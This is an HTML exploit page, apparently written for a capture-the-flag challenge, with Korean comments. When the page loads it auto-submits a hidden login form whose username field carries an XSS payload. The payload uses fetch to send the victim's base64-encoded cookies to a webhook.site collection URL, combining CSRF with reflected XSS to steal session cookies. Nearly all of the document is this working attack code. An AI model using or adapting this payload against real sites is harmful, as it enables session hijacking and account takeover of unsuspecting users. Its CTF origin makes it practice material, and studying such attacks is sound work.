<html>
  <body>
    <script>
      function startExploit() {
        // 1. https://webhook.site/ 에 방문해서 고유 URL을 복사하세요.
        // 2. 아래 'webhookUrl' 변수의 값을 복사한 URL로 바꾸세요.
        const webhookUrl = 'https://webhook.site/37bdbd68-15e2-4abe-8c35-33e87e040b14';

        const form = document.createElement('form');
        form.method = 'POST';
        // 봇이 상호작용하는 CTF 서버 주소. (bot.js의 BASE_URL 참고)
        form.action = 'http://122.0.0.1:58039/login'; 

        const usernameInput = document.createElement('input');
        usernameInput.type = 'hidden';
        usernameInput.name = 'username';
        
        // 수정된 페이로드: 문자열 연결(+)을 사용해 webhookUrl 변수가 올바르게 삽입되도록 수정
        usernameInput.value = '<img src=x onerror="fetch(\'' + webhookUrl + '?data=\' + btoa(document.cookie))">';
        
        const passwordInput = document.createElement('input');
        passwordInput.type = 'hidden';
        passwordInput.name = 'password';
        passwordInput.value = 'trigger-login-fail';

        const csrfInput = document.createElement('input');
        csrfInput.type = 'hidden';
        csrfInput.name = '_csrf';
        csrfInput.value = '';

        form.appendChild(usernameInput);
        form.appendChild(passwordInput);
        form.appendChild(csrfInput);

        document.body.appendChild(form);
        form.submit();
      }
      
      // 페이지가 로드되면 바로 공격 시작
      window.onload = startExploit;
    </script>
    <h1>Executing...</h1>
  </body>
</html>

